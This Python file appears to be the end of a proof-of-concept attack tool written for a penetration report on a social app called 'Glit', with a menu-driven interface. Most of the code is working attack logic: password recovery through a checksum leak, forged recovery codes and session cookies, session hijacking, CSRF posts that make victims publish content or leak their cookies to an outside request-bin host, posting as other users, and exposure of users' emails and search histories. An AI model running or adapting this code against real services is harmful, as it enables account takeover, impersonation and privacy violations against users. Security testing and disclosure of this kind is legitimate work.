        :return: Server's response.

        :type search_request: SearchRequest
        :rtype: JsonResult
        """

        request = Message(
            code=Code.SEARCH_REQUEST,
            body=enum_dataclass_asdict(search_request),
        )

        return self.send_receive(request).body

    def fetch_posts(self, post_fetch_request: PostFetchRequest) -> JsonResult:
        """
        Performs a posts fetch with the given info.

        :param post_fetch_request: The posts fetch request for the request.
        :return: Server's response.

        :type post_fetch_request: PostFetchRequest
        :rtype: Message
        """

        request = Message(
            code=Code.FETCH_POSTS,
            body=enum_dataclass_asdict(post_fetch_request),
        )

        return self.send_receive(request).body


class WebClient:
    """
    Client for the Web API
    """

    def __init__(self, url: str):
        """
        Initializes the client.

        :param url: The URL of the Web API.
        :return: None

        :type url: str
        :rtype: None
        """

        self.url = url
        self.cookies = None
        self.user_info: typing.Optional[UserInfo] = None

    def set_cookie(self, name: str, value: str) -> None:
        """
        Sets a cookie.

        :param name: The name of the cookie.
        :param value: The value of the cookie.
        :return: None

        :type name: str
        :type value: str
        :rtype: None
        """

        self.cookies = {name: value}

    def is_authenticated(self) -> bool:
        """
        Checks if the client is authenticated.

        :return: True if the client is authenticated.
        :rtype: bool
        """

        return self.cookies is not None

    def _request(
        self,
        method: HttpMethod,
        endpoint: str,
        params: typing.Optional[dict] = None,
        json_field: typing.Optional[JsonResult] = None,
    ) -> requests.Response:
        """
        Performs a request to the given endpoint, with the given method,
        with the given parameters and json.
        Also adds self.cookies.

        :param method: The HTTP method for the request.
        :param endpoint: The endpoint.
        :param params: The parameters.
        :param json_field: The json.
        :return: Server's response.

        :type method: HttpMethod
        :type endpoint: str
        :type params: dict
        :type json_field: JsonResult
        :rtype: requests.Response
        """

        logging.debug(
            f"Sending request: {method.value} {endpoint} {params=} {json_field=}"
        )

        return requests.request(
            method.value,
            self.url + endpoint,
            params=params,
            json=json_field,
            cookies=self.cookies,
        )

    def _get(
        self, endpoint: str, params: typing.Optional[dict] = None
    ) -> requests.Response:
        """
        Performs a GET request to the given endpoint with the given parameters.

        :param endpoint: The endpoint.
        :param params: The parameters.
        :return: Server response.

        :type endpoint: str
        :type params: dict
        :rtype: requests.Response
        """

        return self._request(HttpMethod.GET, endpoint, params=params)

    def _post(self, endpoint: str, json_field: JsonResult) -> requests.Response:
        """
        Performs a POST request to the given endpoint with the given parameters.

        :param endpoint: The endpoint.
        :param json_field: The parameters.
        :return: Server's json response.

        :type endpoint: str
        :type json_field: JsonResult
        :rtype: requests.Response
        """

        return self._request(HttpMethod.POST, endpoint, json_field=json_field)

    def auth(self, auth_info: AuthInformation) -> bool:
        """
        Authenticates the client to the Web API.
        Sets the cookie and the user_info after a successful authentication.

        :param auth_info: The authentication information.
        :return: Whether the authentication was successful

        :type auth_info: AuthInformation
        :rtype: bool
        """

        response = self._post(
            WebEndPoints.LOGIN.value,
            json_field=(auth_info.user_name, auth_info.password),
        )

        if not response.ok:
            logging.info(AUTH_FAIL_TEXT)
            return False

        response_json = response.json()

        user_info_dict = response_json[AUTH_USER_DICT_KEY_NAME]
        cookie = response_json[WEB_COOKIE_NAME]

        self.user_info = UserInfo.from_dict(user_info_dict)
        self.set_cookie(WEB_COOKIE_NAME, cookie)
        logging.info(AUTH_SUCCESS_TEXT)

        return True

    def search(self, search_request: SearchRequest) -> JsonResult:
        """
        Performs a search.

        :param search_request: The search request.
        :return: Server's json response parsed.

        :type search_request: SearchRequest
        :rtype: JsonResult
        """

        return self._get(
            WebEndPoints.SEARCH.value,
            params=enum_dataclass_asdict(
                WebSearchRequest(
                    search_request.search_type, search_request.search_entry
                )
            ),
        ).json()

    def fetch_posts(self, post_fetch_request: PostFetchRequest) -> JsonResult:
        """
        Performs a posts fetch.

        :param post_fetch_request: The posts fetch request.
        :return: Server's json response parsed.

        :type post_fetch_request: PostFetchRequest
        :rtype: JsonResult
        """

        return self._get(
            WebEndPoints.FETCH_POSTS.value,
            params=enum_dataclass_asdict(
                WebPostFetchRequest(
                    feedOwnerId=post_fetch_request.feed_owner_id,
                    count=post_fetch_request.glit_count,
                    date=post_fetch_request.end_date,
                )
            ),
        ).json()

    def publish_comment(self, info: Comment) -> JsonResult:
        """
        Performs a comment.

        :param info: The comment.
        :return: Server's json response parsed.

        :type info: Comment
        :rtype: JsonResult
        """

        return self._post(
            WebEndPoints.PUBLISH_COMMENT.value,
            json_field=enum_dataclass_asdict(info),
        ).json()

    def publish_post(self, info: Post) -> JsonResult:
        """
        Performs a post.

        :param info: The post.
        :return: Server's json response parsed.

        :type info: Post
        :rtype: JsonResult
        """

        return self._get(
            WebEndPoints.PUBLISH_POST.value,
            params=enum_dataclass_asdict(info),
        ).json()

    def fetch_search_history(self, user_id: int) -> JsonResult:
        """
        Performs a search history fetch.

        :param user_id: ID of the user history of whom to fetch.
        :return: Server's json response parsed.

        :type user_id: int
        :rtype: JsonResult
        """

        return self._get(
            WebEndPoints.FETCH_SEARCH_HISTORY.value + str(user_id),
        ).json()

    def recover_password_request(self, user_name: str) -> JsonResult:
        """
        Performs a recover password request.

        :param user_name: The user name for which to recover.
        :return: Server's json response parsed or empty dict if there is no json.

        :type user_name: str
        :rtype: JsonResult
        """

        try:
            return self._post(
                WebEndPoints.RECOVER_PASSWORD.value,
                json_field=user_name,
            ).json()
        except json.JSONDecodeError:
            return {}

    def recover_password_validate(
        self, user_name: str, validation_string: str
    ) -> JsonResult:
        """
        Performs a recover password validation.

        :param user_name: The user name for which to recover.
        :param validation_string: The validation string.
        :return: Server's json response parsed.

        :type user_name: str
        :type validation_string: str
        :rtype: JsonResult
        """

        return self._post(
            WebEndPoints.RECOVER_PASSWORD_VALIDATE.value,
            json_field=(user_name, validation_string),
        ).json()


class AuthenticationFailure(Exception):
    """
    Should be raised when authentication fails
    """

    def __init__(self, msg="Authentication Failure", *args, **kwargs) -> None:
        """
        Initializes the authentication failure.

        :param msg: The message to display.
        :param args: Passed to parent's init function.
        :param kwargs: Passed to parent's init function.
        :retype: None

        :type msg: str
        :rtype: None
        """

        super().__init__(msg, *args, **kwargs)


@dataclasses.dataclass
class POC:
    """
    Set of functions for vulnerability proof of concept.
    """

    client: typing.Union[Client, WebClient]

    def _find(
        self,
        find_results: list[T],
        result_to_str: typing.Callable[[T], str],
    ) -> T:
        """
        Finds T in the Message using information from the user.

        :param find_results: List of things in which to search.
        :param result_to_str: Function to convert `thing` (T) to a string for user input.
        :return: The T chosen by the user.

        :type find_results: list[T]
        :type result_to_str: typing.Callable[[T], str]
        :rtype: T
        """

        if not find_results:
            raise ValueError("Nothing found")

        if len(find_results) == 1:  # If there is only one, return it
            return find_results[0]

        object_strs = map(result_to_str, find_results)

        print("Please choose one of the following:")
        print(
            "\n".join(
                f"{i}: {object_str}" for i, object_str in enumerate(object_strs)
            )
        )

        index = int(
            input_allowed_options(
                [str(i) for i in range(len(find_results))],
                allowed_options_separator=", ",
            )
        )

        return find_results[index]

    def _find_user(self) -> UserInfo:
        """
        Searches a user using information about their display name.

        :return: The information about the user.
        :rtype: UserInfo
        """

        search_entry = input("Enter display name of a user you want to find: ")
        response = self.client.search(
            SearchRequest(
                search_type=SearchType.SIMPLE, search_entry=search_entry
            )
        )

        print_user_recommendation_and_error_description(response)

        if not isinstance(response, list):
            raise ValueError("Search response is not a list")

        return self._find(
            [UserInfo.from_dict(user) for user in response],
            lambda user_info: user_info.screen_name,
        )

    def _find_post(
        self,
    ) -> tuple[Post, typing.Optional[FeedGestures]]:
        """
        Searches a post using information about the post from the user.

        :return: The post chosen by the user and the feed gestures. (gestures are None when on the web client).
        :rtype: tuple[Post, typing.Optional[FeedGestures]]
        """

        feed_owner = self._find_user()

        post_amount_to_fetch = input_int("Enter amount of posts to fetch: ")

        response = self.client.fetch_posts(
            PostFetchRequest(
                feed_owner_id=feed_owner.id, glit_count=post_amount_to_fetch
            )
        )

        print_user_recommendation_and_error_description(response)

        if not isinstance(response, dict) and not isinstance(response, list):
            raise ValueError("Fetch posts response is not a valid")

        posts, feed_gestures = (response[FEED_POSTS_KEY], FeedGestures.from_dict(response)) if isinstance(response, dict) else (response, None)

        post = self._find(
            [
                Post.from_dict(post)
                for post in posts
                if isinstance(post, dict)
            ],
            lambda post: post.content,
        )

        return post, feed_gestures

    def display_name_to_username(self) -> None:
        """
        Gives a username for a given display name.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        user = self._find_user()

        response = self.client.send_receive(
            Message(
                code=Code.CHANGE_SETTINGS,
                body=enum_dataclass_asdict(UserSettings(id=user.id)),
            )
        )

        username, *_ = USERNAME_REGEX.findall(response.text)

        logging.info(f"The username of '{user.screen_name}' is '{username}'")

    def get_mail(self) -> None:
        """
        Finds and displays the mail of the user.

        :return: None
        :rtype: None
        """

        user = self._find_user()

        logging.info(f"Mail of '{user.screen_name}': {user.mail}")

    def display_search_history(self) -> None:
        """
        Displays the search history for the user specified from stdin.

        :return: None
        :rtype: None
        """

        user = self._find_user()

        response = self.client.fetch_search_history(user.id)

        if not isinstance(response, list):
            raise ValueError("Search history is not a list")

        search_history = map(UserInfo.from_dict, response)

        logging.info(f"Search history of '{user.screen_name}':\n")
        for entry in search_history:
            print(entry.screen_name)
        print("\n")

    def listen_for_searches(self) -> None:
        """
        Listens for you being searched by other users.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        logging.info("Starting listening for searches. To stop press CTRL+C")

        try:
            while True:
                user_id = self.client.receive_code(Code.YOU_ARE_SEARCHED).body

                if not isinstance(user_id, int):
                    logging.warning("Received user ID is not an integer")
                    continue

                user = self.client.resolve_user_id(user_id)

                logging.info(
                    f"{user.screen_name} searched for at least 2 characters of your name."
                )
        except KeyboardInterrupt:
            logging.info("Stopping")

    def publish_post_overwrite(self) -> None:
        """
        Publishes a post using data from the user, but overwrites other post.

        :return: None
        :rtype: None
        """

        post, _ = self._find_post()

        self.publish_post(post_id=post.id)

    def publish_comment(self) -> None:
        """
        Publishes a comment using data from the user.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, WebClient):
            raise FeatureUnsupportedError()

        if self.client.user_info is None:
            raise StateError()

        post, _ = self._find_post()

        self.client.publish_comment(Comment(glit_id=post.id, content=input("Enter comment: "), user_id=self.client.user_info.id))

    def publish_post(
        self,
        content: typing.Optional[str] = None,
        publisher_id: typing.Optional[int] = None,
        post_id: int = ID_DEFAULT,
        feed_owner: typing.Optional[UserInfo] = None,
    ) -> None:
        """
        Publishes a post using data from the user.

        :param content: The content of the post.
        :param publisher_id: The ID of the publisher.
        :param post_id: The ID of the post.
        :param feed_owner: The feed owner.
        :return: None

        :type content: typing.Optional[str]
        :type publisher_id: typing.Optional[int]
        :type post_id: int
        :type feed_owner: typing.Optional[UserInfo]
        :rtype: None
        """

        if not self.client.is_authenticated():
            raise StateError()

        if publisher_id is None:
            if self.client.user_info is None:
                raise ValueError(
                    "Something went horribly wrong. Expected user info to have some value."
                )
            publisher_id = self.client.user_info.id

        if content is None:
            content = input("What content do you want for your post? ")

        if feed_owner is None:
            print(
                "First, decide on who's feed do you want to post (even private feeds!)"
            )
            feed_owner = self._find_user()

        print("Now you can choose what name/avatar do you want.")
        logging.warning(
            "This does indeed work, but will reset after a page reload/refresh."
        )
        post_display_name = input(
            "What (writer/poster) name do you want to be displayed near your post? (Anything!): "
        )
        print("What avatar do you want for your post? (Enter for options)")
        avatar = UserAvatar(
            input_allowed_options([e.value for e in UserAvatar])
        )
        post = Post(
            feed_owner_id=feed_owner.id,
            publisher_id=publisher_id,
            publisher_screen_name=post_display_name,
            publisher_avatar=avatar,
            content=content,
            id=post_id,
        )

        response = self.client.publish_post(post)

        print_user_recommendation_and_error_description(response)

    def publish_post_custom_user(self) -> None:
        """
        Publishes a post using data from the user as any user.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, WebClient):
            raise FeatureUnsupportedError()

        user = self._find_user()

        self.publish_post(publisher_id=user.id)

    def auth(self) -> None:
        """
        Authenticates the client to the server using data from the user.

        :return: None
        :rtype: None
        """

        username = input(USERNAME_INPUT_PROMPT)
        password = input("Password: ")

        self.client.auth(AuthInformation(user_name=username, password=password))

    def cookie_auth(self) -> None:
        """
        Authenticates the client to the server using the cookie provided by the user.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, WebClient):
            raise FeatureUnsupportedError()

        while True:
            cookie = input("Please enter the cookie: ").strip()

            if self.validate_cookie(cookie):
                break

        self.client.set_cookie(WEB_COOKIE_NAME, cookie)
        while True:
            logging.info("We need to find who is the exact cookie owner")
            cookie_owner = self._find_user()
            correct_user = yes_no_question(f"Are you sure that the owner of the cookie you have given is {cookie_owner.screen_name}")

            if correct_user:
                break

        self.client.user_info = cookie_owner

        logging.info(AUTH_SUCCESS_TEXT)



    def register_unlimited_name(self) -> None:
        """
        Registers the client to the server using data from the user.
        Fills the name to be minimum size and doesn't limit it.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        logging.info("In this poc, you can enter name of any length.")
        logging.info("Short names will be postfixed with spaces.")
        logging.info(
            "There is also no length limit, so you can create a user/display name of any length"
        )

        username = input(USERNAME_INPUT_PROMPT).ljust(MIN_NAME_LENGTH, " ")
        if username.endswith(" "):
            logging.info(
                f"Notice, this means your username will be '{username}'"
            )
        display_name = input("Display Name: ").ljust(MIN_NAME_LENGTH, " ")

        user_info = RegistrationInformation(
            user=UserInfo(
                user_name=username,
                screen_name=display_name,
            )
        )

        self.client.register(user_info)

    def register_invisible_name(self) -> None:
        """
        Registers the client to the server using data from the user.
        Sets the display name to be "invisible"

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        self.client.register(
            RegistrationInformation(
                user=UserInfo(screen_name=" " * MIN_NAME_LENGTH)
            )
        )

    def _password_from_checksum(self, checksum: int) -> str:
        """
        Finds a string with the given checksum.

        :param checksum: The checksum.
        :return: The string.

        :type checksum: int
        :rtype: str
        """

        largest_chars_amount = checksum // sys.maxunicode
        left_over = checksum % sys.maxunicode

        return chr(sys.maxunicode) * largest_chars_amount + chr(left_over)

    def view_posts(self) -> None:
        """
        Displays the posts of the user specified from stdin.

        :return: None
        :rtype: None
        """

        logging.info("Select which post you want to view: ")
        post, _ = self._find_post()

        logging.info(
            f"{post.publisher_screen_name} with the avatar {post.publisher_avatar} "
            + f"posted at {post.date} the following text:\n"
            + f"{post.content}\n"
            + f"with the color {post.background_color} and the font color {post.font_color}"
        )

    def add(self, reaction_type: ReactionType) -> None:
        """
        Adds the specified reaction to a glit specified by user's input.

        :param reaction_type: The type of reaction.
        :return: None

        :type reaction_type: ReactionType
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        post, _ = self._find_post()

        user_id = self.client.user_info.id

        func = (
            self.client.like
            if reaction_type == ReactionType.LIKE
            else self.client.send_wow
        )

        response = func(
            ReactionRequest(
                glit_id=post.id,
                user_id=user_id,
            )
        )

        logging.info(response.text)

    def remove(self, reaction_type: ReactionType) -> None:
        """
        Removes the specified reaction from a glit specified by user's input.

        :param reaction_type: The type of reaction.
        :return: None

        :type reaction_type: ReactionType
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        post, feed_gestures = self._find_post()

        if not feed_gestures:
            raise ValueError("Something went horribly wrong.")

        gesture_map = (
            feed_gestures.likesMap
            if reaction_type == ReactionType.LIKE
            else feed_gestures.wowsMap
        )

        gestures = gesture_map.get(str(post.id))

        if not gestures:
            logging.warning(f"Nothing found to un{reaction_type.name.lower()}")
            return

        first_gesture, *_ = gestures

        func = (
            self.client.unlike
            if reaction_type == ReactionType.LIKE
            else self.client.remove_wow
        )

        response = func(first_gesture.id)

        logging.info(response.text)

    def no_password_auth(self) -> None:
        """
        Authenticates the client to the server without a password.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        if self.client.state != ClientState.UNAUTHENTICATED:
            raise StateError("Already authenticated")

        username = input(USERNAME_INPUT_PROMPT)

        # The password field value has no meaning, it's just some value so the
        # server receives it. It must exists, but we don't care about it's value
        auth_info = AuthInformation(
            user_name=username, password=PASSWORD_FOR_ACCOUNT_AUTH_HACK
        )

        response = self.client.login(auth_info)

        if response.code == Code.LOGIN_ERROR:
            PRINT_USER_RECOMMENDATION_AND_ERROR_DESCRIPTION_MESSAGE(response)
            raise AuthenticationFailure()

        if response.code == Code.LOGIN_INVALID_PASSWORD:
            try:
                account_checksum, *_ = map(
                    int, ACCOUNT_CHECKSUM_REGEX.findall(response.text)
                )
            except Exception as e:
                logging.info("Please check again if the username exists")

                raise e

            username_checksum = self.client._calculate_str_checksum(username)

            password_checksum = account_checksum - username_checksum

            valid_password = self._password_from_checksum(password_checksum)

            auth_info.password = valid_password

            response = self.client.login(auth_info)

            if response.code != Code.LOGIN_SUCCESS:
                raise AuthenticationFailure()

        checksum_validation_response = self.client.validate_checksum(auth_info)

        if not isinstance(checksum_validation_response.body, dict):
            raise ValueError("Server returned invalid response")

        user_info = UserInfo.from_dict(checksum_validation_response.body)

        auth_info.password = user_info.password

        logging.info(AUTH_SUCCESS_TEXT)

        logging.info(
            f"Password for the account '{auth_info.user_name}' found! It is '{auth_info.password}'"
        )

        self.client.save_user_info(user_info)

    def _post_custom_csrf_post(self, target_id: int, content: str):
        if self.client.user_info is None:
            raise StateError()

        publish_as_self = (
            yes_no_question("Do you want to publish as self?")
            if isinstance(self.client, WebClient)  # Supported only on the web
            else True
        )

        if publish_as_self:
            publisher_id = self.client.user_info.id
        else:
            logging.info("Who do you want to publish as?")
            publisher_id = self._find_user().id

        csrf_post = Post(
            feed_owner_id=target_id, publisher_id=publisher_id, content=content
        )

        response = self.client.publish_post(csrf_post)

        print_user_recommendation_and_error_description(response)

    def post_csrf(self) -> None:
        """
        Posts a message which utilizes a CSRF vulnerability.

        :return: None
        :rtype: None
        """

        if self.client.user_info is None:
            raise StateError()

        logging.info("You chose to create a CSRF Post.")
        logging.info(
            "The post will contain text of your choosing, but when the target "
            + "reads it, a post will be created with custom content chosen by "
            + "you, at chosen by you date and it will be marked as created by "
            + "your target."
        )

        logging.info("First, choose who is your target:")
        target_user = self._find_user()
        logging.info(
            "Now choose where the target will post your post: (aka who's feed)"
        )
        target_feed_owner = self._find_user()

        logging.info(
            "First, let's create the post the target will create (our goal)"
        )

        targets_post = Post(
            feed_owner_id=target_feed_owner.id,
            publisher_id=target_user.id,
        )

        logging.info(
            "Now we are creating the CSRF Post. It's the thing that the target will see."
        )
        self._post_custom_csrf_post(
            target_id=target_user.id,
            content=POST_CSRF_CONTENT_FORMATTER(
                input(
                    "What do you want to be displayed to the target in your csrf post? "
                ),
                WebEndPoints.PUBLISH_POST.value,
                targets_post,
            ),
        )

    def validate_cookie(self, cookie: str) -> bool:
        """
        Checks if the cookie is valid.

        :param cookie: The cookie.
        :return: True if the cookie is valid.

        :type cookie: str
        :rtype: bool
        """

        if not isinstance(self.client, WebClient):
            raise FeatureUnsupportedError()

        tmp_client = WebClient(self.client.url)
        tmp_client.set_cookie(WEB_COOKIE_NAME, cookie)

        response = tmp_client._get(f"{WebEndPoints.SEARCH.value}")

        return response.status_code != AUTH_ERROR_HTTP_CODE

    def recover_password(self) -> None:
        """
        Recovers the password of the account specified by user's input.

        :return: None
        :rtype: None
        """

        if not isinstance(self.client, WebClient):
            raise FeatureUnsupportedError()

        target_user = self._find_user()
        target_user_name = input(
            "Please enter the username of your target "
            + "(not the screen name, the user name): "
        )

        user_id_validation_part = "".join(
            string.ascii_uppercase[int(i)] for i in str(target_user.id)
        )
        validation_str = "".join(
            datetime.datetime.now()
            .strftime(f"%d%m {user_id_validation_part} %H%M")
            .split()
        )

        self.client.recover_password_request(target_user_name)
        password = self.client.recover_password_validate(
            target_user_name, validation_str
        )
        logging.info(f"Password for {target_user_name} is {password}")

    def get_cookie_app(self, active=True) -> None:
        """
        Gets the cookie of the account specified by user's input.
        Works with the app only.

        :param active: Whether or not the attack should be active.
        :return: None

        :type active: bool
        :rtype: None
        """

        if not isinstance(self.client, Client):
            raise FeatureUnsupportedError()

        if active:
            logging.info("Who is your target?")

            target = self._find_user()

            logging.info("Creating a CSRF to get the cookie")

            self._post_custom_csrf_post(
                target_id=target.id,
                content=VISIT_FEED_CSRF_CONTENT_FORMATTER(
                    input(
                        "What do you want to be displayed to the target in your csrf post? "
                    ),
                    WebEndPoints.FETCH_POSTS.value,
                    self.client.user_info.id,
                ),
            )

        logging.info(
            "Wait for results. You may stop waiting by pressing CTRL+C"
        )

        try:
            while True:
                received_text = self.client.receive_code(
                    Code.YOUR_POSTS_FETCHED
                ).text

                cookie, *_ = FEED_LOAD_COOKIE_REGEX.findall(received_text)
                user_id, *_ = map(
                    int, FEED_LOAD_ID_REGEX.findall(received_text)
                )

                user = self.client.resolve_user_id(user_id)

                logging.info(
                    f"The cookie of {user.screen_name} (id={id=}) is '{cookie}'"
                )
        except KeyboardInterrupt:
            logging.info("Stopped.")

    def get_cookie(self) -> None:
        """
        Gets the cookie of the account specified by user's input.

        :return: None
        :rtype: None
        """

        target_user_name = input("Please enter the username of your target: ")

        logging.warning(
            "Acquiring the cookie of a user requires them being logged in and "
            + "you knowing the time when they did so."
        )

        assistance_required = yes_no_question(
            "Do you want assistance with acquiring the log-in time?",
            default_answer=True,
        )

        if assistance_required:
            if self.client.user_info is None:
                logging.info("Login and try again.")
                raise StateError()

            logging.info(
                "You will need an external service which is capable of "
                + "receiving HTTP GET requests and recording the time of "
                + "their arrival."
            )

            logging.info(
                "Example of such service is https://public.requestbin.com/r/"
            )
            logging.info("You need to visit this URL to get yourself a bin.")

            url = input("Enter the url to the service: ")

            logging.info("We will create an CSRF post, on target's page")
            text = input(
                "What's the text that will be displayed on that post to the "
                + "target? "
            )

            logging.info("Now we need to find the target by display name.")
            target = self._find_user()

            self._post_custom_csrf_post(
                target_id=target.id,
                content=CSRF_CONTENT_FORMATTER(url, text),
            )

            logging.info("Now your task is to get the time of log-in.")

        username_md5 = hashlib.md5(target_user_name.encode()).hexdigest()

        while True:
            date = input("Enter the date of log-in as ddmmyyyy: ")
            time = input("Enter the time of log-in as hhMM: ")

            cookie = f"{date}.{username_md5}.{time}.{date}"

            if self.validate_cookie(cookie):
                logging.info(f"Success! The cookie is '{cookie}'")
                return

            logging.warning("The time was wrong.")


MenuEntry = typing.Tuple[str, typing.Callable[[], None]]
Menu = typing.Callable[[POC], typing.List[MenuEntry]]


def menu_tui(menu: Menu, poc: POC) -> None:
    """
    Displays the given menu and runs the selected function

    :param menu: The menu to display
    :param poc: The poc instance for the menu
    :return: None

    :type menu: Menu
    :type poc: POC
    :rtype: None
    """
    initialized_menu = menu(poc)

    if (
        len(initialized_menu) >= 2
    ):  # You can choose only if you have at least 2 options
        print("POC options:")
        for i, (name, _) in enumerate(initialized_menu):
            print(f"{i}: {name}")

        index_str = input_allowed_options(
            [str(i) for i in range(len(initialized_menu))]
        )

        index = int(index_str)
    else:
        index = 0

    _, func = initialized_menu[index]

    exception_tui(func)


REGISTER_MENU: Menu = lambda poc: [
    ("Short/Long Name", poc.register_unlimited_name),
    ("Invisible Name", poc.register_invisible_name),
    ("Abort", lambda: None),
]


LIKES_MENU: Menu = lambda poc: [
    ("Add Like", lambda: poc.add(ReactionType.LIKE)),
    ("Remove Like", lambda: poc.remove(ReactionType.LIKE)),
    ("Abort", lambda: None),
]

AUTH_MENU: Menu = lambda poc: [
    ("Login (with password)", poc.auth),
    ("Login (without password)/Get password", poc.no_password_auth),
    ("Abort", lambda: None),
]

WOW_MENU: Menu = lambda poc: [
    ("Add Wow", lambda: poc.add(ReactionType.WOW)),
    ("Remove Wow", lambda: poc.remove(ReactionType.WOW)),
    ("Abort", lambda: None),
]

PRIVACY_MENU: Menu = lambda poc: [
    ("Search History", poc.display_search_history),
    ("View Private Posts", poc.view_posts),
    ("Get Mail", poc.get_mail),
    ("See who searches you", poc.listen_for_searches),
    ("FORGOT TO ADD: Find user name", poc.display_name_to_username),
    ("See who visits your feed", lambda: poc.get_cookie_app(active=False)),
    ("Abort", lambda: None),
]

APP_PUBLISH_MENU: Menu = lambda poc: [
    ("Publish Post", poc.publish_post),
    ("Steal/Move/Edit/Overwrite Post", poc.publish_post_overwrite),
    ("Abort", lambda: None),
]

WEB_PUBLISH_MENU: Menu = lambda poc: [
    ("Publish Post", poc.publish_post),
    ("Publish Comment", poc.publish_comment),
    ("Publish Post As Another User", poc.publish_post_custom_user),
    ("Abort", lambda: None),
]

APP_MENU: Menu = lambda poc: [
    ("Glit Likes", lambda: menu_tui(LIKES_MENU, poc)),
    ("Wow", lambda: menu_tui(WOW_MENU, poc)),
    ("Publish", lambda: menu_tui(APP_PUBLISH_MENU, poc)),
    ("Privacy", lambda: menu_tui(PRIVACY_MENU, poc)),
    ("Get Cookie", poc.get_cookie_app),
    ("Exit", lambda: sys.exit()),
]

APP_AUTH_MENU: Menu = lambda poc: [
    ("Authentication", lambda: menu_tui(AUTH_MENU, poc)),
    ("Register", lambda: menu_tui(REGISTER_MENU, poc)),
]

WEB_MENU: Menu = lambda poc: [
    ("Get password for user", poc.recover_password),
    ("Create a CSRF post", poc.post_csrf),
    ("Get cookie (stealthy)", poc.get_cookie),
    ("Publish", lambda: menu_tui(WEB_PUBLISH_MENU, poc)),
    ("Exit", lambda: sys.exit()),
]

WEB_AUTH_MENU: Menu = lambda poc: [
    ("Authentication", poc.auth),
    ("Hijack session via cookie", poc.cookie_auth)
]


def start_poc_tui() -> None:
    """
    Function that starts the proof of concept client (based on user's choice)
    and menu.

    :return: None
    :rtype: None
    """

    modes = {"web": start_web_poc, "app": start_app_poc}

    print("Choose mode:")
    for mode_name in modes:
        print(mode_name)

    mode = input_allowed_options(list(modes.keys()), input_modifier=str.strip)

    modes[mode]()


def start_app_poc() -> None:
    """
    Function that starts the proof of concept client and menu.

    :return: None
    :rtype: None
    """

    with Client(
        ip=SERVER_CONFIG.ip,
        port=SERVER_CONFIG.port,
        message_parser=MessageParser(
            code_separator=MESSAGE_CODE_SEPARATOR,
            body_separator=MESSAGE_BODY_SEPARATOR,
            end_mark=MESSAGE_END_MARK,
        ),
    ) as client:
        poc = POC(client)

        auth_poc(APP_AUTH_MENU, poc)
        run_poc(APP_MENU, poc)


def auth_poc(auth_menu: Menu, poc: POC) -> None:
    """
    Function that ensures that the poc is authenticated.

    :param auth_menu: The authentication menu
    :param poc: The poc instance
    :return: None

    :type auth_menu: Menu
    :type poc: POC
    :rtype: None
    """

    while not poc.client.is_authenticated():
        menu_tui(auth_menu, poc)


def run_poc(menu: Menu, poc: POC) -> None:
    """
    Function that runs the poc.

    :param menu: The menu
    :param poc: The poc instance
    :return: None

    :type menu: Menu
    :type poc: POC
    :rtype: None
    """

    while True:
        menu_tui(menu, poc)


def start_web_poc() -> None:
    """
    Function that starts the proof of concept client and menu for the web API.

    :return: None
    :rtype: None
    """

    client = WebClient(url=WEB_API_URL)

    poc = POC(client)

    auth_poc(WEB_AUTH_MENU, poc)
    run_poc(WEB_MENU, poc)


def main():
    setup_logging()

    print("Welcome to the penetration report Proof-Of-Concept by Den Loob")
    print("+-------+")

    keyboard_function_tui(start_poc_tui)


if __name__ == "__main__":
    main()
